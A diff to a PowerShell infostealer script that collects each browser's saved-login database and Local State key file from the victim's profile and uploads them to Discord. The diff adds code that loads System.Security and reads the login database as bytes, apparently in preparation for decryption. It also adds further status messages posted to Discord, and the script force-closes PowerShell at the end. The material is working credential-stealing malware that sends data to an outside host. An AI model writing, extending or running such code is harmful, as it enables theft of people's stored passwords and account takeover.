@@ -73,9 +73,13 @@ try {
         $loginData = "$env:LOCALAPPDATA\$browser\User Data\Default\Login Data"
         $localState = "$env:LOCALAPPDATA\$browser\User Data\Local State"
         if (Test-Path $loginData -and Test-Path $localState) {
+            Add-Type -AssemblyName "System.Security"
+            $encryptedData = Get-Content $loginData -AsByteStream
             Send-FileToDiscord -filePath $loginData -fileName "$browser_LoginData"
             Send-FileToDiscord -filePath $localState -fileName "$browser_LocalState"
             Send-PayloadToDiscord -content "Browser: $browser - Login Data and Local State files uploaded."
+        } else {
+            Send-PayloadToDiscord -content "Browser: $browser - No credentials found."
         }
     }
 } catch {
@@ -97,4 +101,5 @@ try {
     Stop-Process -Name "powershell" -Force
 } catch {
     Write-Host "Error closing PowerShell: $_"
+    Send-PayloadToDiscord -content "Error closing PowerShell: $_"
 }
